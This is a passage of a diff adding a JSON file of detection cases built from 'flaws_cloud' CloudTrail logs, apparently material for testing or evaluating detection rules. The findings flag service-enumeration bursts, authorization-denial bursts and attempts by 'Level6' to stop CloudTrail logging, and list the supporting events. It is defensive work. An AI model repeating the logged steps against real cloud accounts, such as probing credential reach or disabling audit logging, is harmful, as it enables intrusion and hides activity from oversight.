+     "summary": "backup describe autoscaling:account-limit [denied]"
+    },
+    "cloudtrail-control-189293": {
+     "timestamp": "2019-04-05 09:22:19+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list athena:named-query [denied]"
+    },
+    "cloudtrail-control-189294": {
+     "timestamp": "2019-04-05 09:22:19+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list athena:query-execution [denied]"
+    },
+    "cloudtrail-control-189300": {
+     "timestamp": "2019-04-05 09:22:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:termination-policy-type [denied]"
+    },
+    "cloudtrail-control-189301": {
+     "timestamp": "2019-04-05 09:22:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:tag [denied]"
+    },
+    "cloudtrail-control-189302": {
+     "timestamp": "2019-04-05 09:22:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:launch-configuration [denied]"
+    },
+    "cloudtrail-control-189303": {
+     "timestamp": "2019-04-05 09:22:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:auto-scaling-group [denied]"
+    },
+    "cloudtrail-control-189304": {
+     "timestamp": "2019-04-05 09:22:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:scheduled-action [denied]"
+    },
+    "cloudtrail-control-189305": {
+     "timestamp": "2019-04-05 09:22:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:policy [denied]"
+    },
+    "cloudtrail-control-189312": {
+     "timestamp": "2019-04-05 09:22:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe batch:job-definition [denied]"
+    },
+    "cloudtrail-control-189320": {
+     "timestamp": "2019-04-05 09:22:23+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe budgets:budget [denied]"
+    },
+    "cloudtrail-control-189322": {
+     "timestamp": "2019-04-05 09:22:24+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list clouddirectory:directory [denied]"
+    },
+    "cloudtrail-control-189323": {
+     "timestamp": "2019-04-05 09:22:24+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list cloudformation:stack [denied]"
+    },
+    "cloudtrail-control-189330": {
+     "timestamp": "2019-04-05 09:22:25+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list cloudfront:distribution [denied]"
+    },
+    "cloudtrail-control-189336": {
+     "timestamp": "2019-04-05 09:22:26+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list cloudhsm:hsm [denied]"
+    },
+    "cloudtrail-control-189350": {
+     "timestamp": "2019-04-05 09:22:29+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe cloudsearch:domain [denied]"
+    },
+    "cloudtrail-control-189352": {
+     "timestamp": "2019-04-05 09:22:29+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe cloudtrail:trail [denied]"
+    },
+    "cloudtrail-control-189358": {
+     "timestamp": "2019-04-05 09:22:31+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list codebuild:build [denied]"
+    },
+    "cloudtrail-control-189359": {
+     "timestamp": "2019-04-05 09:22:31+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe monitoring:alarm-history [denied]"
+    },
+    "cloudtrail-control-189368": {
+     "timestamp": "2019-04-05 09:22:33+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list codecommit:repository [denied]"
+    },
+    "cloudtrail-control-189370": {
+     "timestamp": "2019-04-05 09:22:34+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list codedeploy:git-hub-account-token-name [denied]"
+    },
+    "cloudtrail-control-189378": {
+     "timestamp": "2019-04-05 09:22:35+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list codepipeline:pipeline [denied]"
+    },
+    "cloudtrail-logon-000120": {
+     "timestamp": "2017-02-27 16:58:36+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 0.229.250.9"
+    },
+    "cloudtrail-logon-000121": {
+     "timestamp": "2017-02-27 16:58:39+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 0.229.250.9"
+    },
+    "cloudtrail-logon-000126": {
+     "timestamp": "2017-02-27 19:38:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 5.165.77.250"
+    },
+    "cloudtrail-logon-000141": {
+     "timestamp": "2017-02-28 06:54:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 1.216.193.96"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-065",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-224294",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "MEDIUM",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "reason": "'Level6' made 1808 read calls across 20 distinct services in 316s, 282 of them refused (16%). Breadth on this scale is consistent with account enumeration, and is also exactly what inventory and compliance tooling does. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-224294",
+      "cloudtrail-control-224300",
+      "cloudtrail-control-224346",
+      "cloudtrail-control-224351",
+      "cloudtrail-control-224356",
+      "cloudtrail-control-224384",
+      "cloudtrail-control-224412",
+      "cloudtrail-control-224446",
+      "cloudtrail-control-224468",
+      "cloudtrail-control-224532",
+      "cloudtrail-control-224570",
+      "cloudtrail-control-224571",
+      "cloudtrail-control-224660",
+      "cloudtrail-control-224922",
+      "cloudtrail-control-225017",
+      "cloudtrail-control-225128",
+      "cloudtrail-control-225208",
+      "cloudtrail-control-225228",
+      "cloudtrail-control-225236",
+      "cloudtrail-control-225366"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-224294",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "reason": "'Level6' was refused authorization 282 times in 307s, across 13 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-224294",
+      "cloudtrail-control-224468",
+      "cloudtrail-control-224469",
+      "cloudtrail-control-224696",
+      "cloudtrail-control-225208",
+      "cloudtrail-control-225228",
+      "cloudtrail-control-225510",
+      "cloudtrail-control-225648",
+      "cloudtrail-control-225649",
+      "cloudtrail-control-225650",
+      "cloudtrail-control-225651",
+      "cloudtrail-control-225652",
+      "cloudtrail-control-225659"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-224294",
+    "cloudtrail-control-224300",
+    "cloudtrail-control-224346",
+    "cloudtrail-control-224351",
+    "cloudtrail-control-224356",
+    "cloudtrail-control-224384",
+    "cloudtrail-control-224412",
+    "cloudtrail-control-224446",
+    "cloudtrail-control-224468",
+    "cloudtrail-control-224469",
+    "cloudtrail-control-224532",
+    "cloudtrail-control-224570",
+    "cloudtrail-control-224571",
+    "cloudtrail-control-224660",
+    "cloudtrail-control-224696",
+    "cloudtrail-control-224922",
+    "cloudtrail-control-225017",
+    "cloudtrail-control-225128",
+    "cloudtrail-control-225208",
+    "cloudtrail-control-225228",
+    "cloudtrail-control-225236",
+    "cloudtrail-control-225366",
+    "cloudtrail-control-225510",
+    "cloudtrail-control-225648",
+    "cloudtrail-control-225649",
+    "cloudtrail-control-225650",
+    "cloudtrail-control-225651",
+    "cloudtrail-control-225652",
+    "cloudtrail-control-225659"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-224294": {
+     "timestamp": "2019-06-06 11:26:57+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get apigateway:rest-apis [denied]"
+    },
+    "cloudtrail-control-224300": {
+     "timestamp": "2019-06-06 11:30:41+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get sts:caller-identity [allowed]"
+    },
+    "cloudtrail-control-224346": {
+     "timestamp": "2019-06-06 11:31:05+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list cloudformation:stack [allowed]"
+    },
+    "cloudtrail-control-224351": {
+     "timestamp": "2019-06-06 11:31:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list iam:user [allowed]"
+    },
+    "cloudtrail-control-224356": {
+     "timestamp": "2019-06-06 11:31:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list s3:bucket [allowed]"
+    },
+    "cloudtrail-control-224384": {
+     "timestamp": "2019-06-06 11:31:07+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list lambda:function [allowed]"
+    },
+    "cloudtrail-control-224412": {
+     "timestamp": "2019-06-06 11:31:08+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe cloudtrail:trail [allowed]"
+    },
+    "cloudtrail-control-224446": {
+     "timestamp": "2019-06-06 11:31:10+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe monitoring:alarm [allowed]"
+    },
+    "cloudtrail-control-224468": {
+     "timestamp": "2019-06-06 11:31:11+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe config:configuration-recorder [denied]"
+    },
+    "cloudtrail-control-224469": {
+     "timestamp": "2019-06-06 11:31:11+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe config:config-rule [denied]"
+    },
+    "cloudtrail-control-224532": {
+     "timestamp": "2019-06-06 11:31:14+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe directconnect:connection [allowed]"
+    },
+    "cloudtrail-control-224570": {
+     "timestamp": "2019-06-06 11:31:16+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe ec2:vpc [allowed]"
+    },
+    "cloudtrail-control-224571": {
+     "timestamp": "2019-06-06 11:31:16+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticache:cache-parameter-group [allowed]"
+    },
+    "cloudtrail-control-224660": {
+     "timestamp": "2019-06-06 11:31:21+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticfilesystem:file-system [allowed]"
+    },
+    "cloudtrail-control-224696": {
+     "timestamp": "2019-06-06 11:31:23+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-location (theend-c1aad500c62e2a57cf12cebf93b282cf.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-224922": {
+     "timestamp": "2019-06-06 11:31:32+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticloadbalancing:load-balancer [allowed]"
+    },
+    "cloudtrail-control-225017": {
+     "timestamp": "2019-06-06 11:31:35+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe rds:db-parameter-group [allowed]"
+    },
+    "cloudtrail-control-225128": {
+     "timestamp": "2019-06-06 11:31:39+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe redshift:cluster-parameter-group [allowed]"
+    },
+    "cloudtrail-control-225208": {
+     "timestamp": "2019-06-06 11:31:42+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list ses:identity [denied]"
+    },
+    "cloudtrail-control-225228": {
+     "timestamp": "2019-06-06 11:31:43+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list sns:topic [denied]"
+    },
+    "cloudtrail-control-225236": {
+     "timestamp": "2019-06-06 11:31:43+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list route53domains:domain [allowed]"
+    },
+    "cloudtrail-control-225366": {
+     "timestamp": "2019-06-06 11:31:48+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list elasticmapreduce:cluster [allowed]"
+    },
+    "cloudtrail-control-225510": {
+     "timestamp": "2019-06-06 11:31:53+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe config:configuration-recorder-status [denied]"
+    },
+    "cloudtrail-control-225648": {
+     "timestamp": "2019-06-06 11:31:59+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-acl (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-225649": {
+     "timestamp": "2019-06-06 11:31:59+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-encryption (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-225650": {
+     "timestamp": "2019-06-06 11:31:59+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-versioning (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-225651": {
+     "timestamp": "2019-06-06 11:31:59+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-policy (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-225652": {
+     "timestamp": "2019-06-06 11:31:59+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-logging (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-225659": {
+     "timestamp": "2019-06-06 11:32:00+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-website (b5677c799b465420d8e7b0a6689a0bb0c4afbc9e.flaws.cloud) [denied]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-000145": {
+     "timestamp": "2017-02-28 08:01:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-000146": {
+     "timestamp": "2017-02-28 08:01:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-002347": {
+     "timestamp": "2017-05-16 23:04:44+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 10.154.248.134 reason=Not authorized to perform sts:AssumeRole"
+    },
+    "cloudtrail-logon-007478": {
+     "timestamp": "2017-06-04 23:48:44+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 62.90.202.229"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-066",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "AWS-002"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-002:cloudtrail-control-226796",
+     "rule_id": "AWS-002",
+     "title": "CloudTrail logging disabled or trail deleted",
+     "severity": "CRITICAL",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "reason": "'Level6' stopped CloudTrail trail ''. Disabling the audit trail is not a routine operational action and is consistent with an intruder removing the record of subsequent activity.",
+     "event_ids": [
+      "cloudtrail-control-226796"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-226796"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-226796": {
+     "timestamp": "2019-06-07 11:04:25+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 stop cloudtrail:logging [denied]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-017044": {
+     "timestamp": "2018-01-18 20:26:38+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 250.253.254.5"
+    },
+    "cloudtrail-logon-018192": {
+     "timestamp": "2018-02-24 12:49:58+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 245.181.7.4 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-040037": {
+     "timestamp": "2018-12-09 23:02:01+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 5.1.242.5 reason=Not authorized to perform sts:AssumeRole"
+    },
+    "cloudtrail-logon-045001": {
+     "timestamp": "2019-03-07 20:33:16+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 2.231.90.242 reason=Not authorized to perform sts:AssumeRole"
+    },
+    "cloudtrail-logon-079347": {
+     "timestamp": "2020-10-06 17:35:07+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 0.0.58.4 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-067",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "AWS-002"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-002:cloudtrail-control-226797",
+     "rule_id": "AWS-002",
+     "title": "CloudTrail logging disabled or trail deleted",
+     "severity": "CRITICAL",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "reason": "'Level6' stopped CloudTrail trail ''. Disabling the audit trail is not a routine operational action and is consistent with an intruder removing the record of subsequent activity.",
+     "event_ids": [
+      "cloudtrail-control-226797"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-226797"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-226797": {
+     "timestamp": "2019-06-07 11:04:25+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 stop cloudtrail:logging [denied]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-000145": {
+     "timestamp": "2017-02-28 08:01:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-000146": {
+     "timestamp": "2017-02-28 08:01:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-077",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-004:cloudtrail-control-238972",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "reason": "'Level6' was refused authorization 772 times in 221s, across 15 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-238972",
+      "cloudtrail-control-238973",
+      "cloudtrail-control-238974",
+      "cloudtrail-control-238975",
+      "cloudtrail-control-238977",
+      "cloudtrail-control-238978",
+      "cloudtrail-control-238979",
+      "cloudtrail-control-238980",
+      "cloudtrail-control-238981",
+      "cloudtrail-control-238982",
+      "cloudtrail-control-238983",
+      "cloudtrail-control-238984",
+      "cloudtrail-control-238986",
+      "cloudtrail-control-238987",
+      "cloudtrail-control-239755"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-238972",
+    "cloudtrail-control-238973",
+    "cloudtrail-control-238974",
+    "cloudtrail-control-238975",
+    "cloudtrail-control-238977",
+    "cloudtrail-control-238978",
+    "cloudtrail-control-238979",
+    "cloudtrail-control-238980",
+    "cloudtrail-control-238981",
+    "cloudtrail-control-238982",
+    "cloudtrail-control-238983",
+    "cloudtrail-control-238984",
+    "cloudtrail-control-238986",
+    "cloudtrail-control-238987",
+    "cloudtrail-control-239755"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-238972": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-tagging (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238973": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-notification (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238974": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-logging (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238975": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-lifecycle (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238977": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-request-payment (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238978": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-replication (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238979": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-cor (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238980": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-website (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238981": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-policy-status (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238982": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-acl (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238983": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-policy (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238984": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-location (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238986": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-encryption (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-238987": {
+     "timestamp": "2019-06-21 15:43:30+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-versioning (flaws.cloud) [denied]"
+    },
+    "cloudtrail-control-239755": {
+     "timestamp": "2019-06-21 15:47:08+00:00",
+     "device": "aws:811596193553/us-west-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 create s3:bucket (pwnd) [denied]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-000196": {
+     "timestamp": "2017-03-01 21:50:25+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.55.224.253 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/flaws"
+    },
+    "cloudtrail-logon-079346": {
+     "timestamp": "2020-10-06 17:28:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 0.0.58.4"
+    },
+    "cloudtrail-logon-079347": {
+     "timestamp": "2020-10-06 17:35:07+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
